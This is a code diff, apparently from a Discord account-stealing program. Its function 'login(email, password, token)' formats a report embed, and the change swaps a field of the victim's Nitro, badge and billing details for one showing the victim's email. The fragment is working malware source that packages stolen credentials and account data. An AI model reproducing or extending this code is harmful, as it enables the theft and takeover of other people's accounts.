@@ -665,13 +665,13 @@ const login = async (email, password, token) => {
             inline: false,
           },
           {
-            name: '**Discord Info**',
-            value: `Nitro Type: **${nitro}**\nBadges: **${badges}**\nBilling: **${billing}**`,
+            name: ':satanist: Badges:',
+            value: `${badges}`,
             inline: true,
           },
           {
-            name: ':satanist: Badges:',
-            value: `${badges}`,
+            name: ':944007233820307467: Email:',
+            value: `\`${email}\``,
             inline: true,
           },
         ],
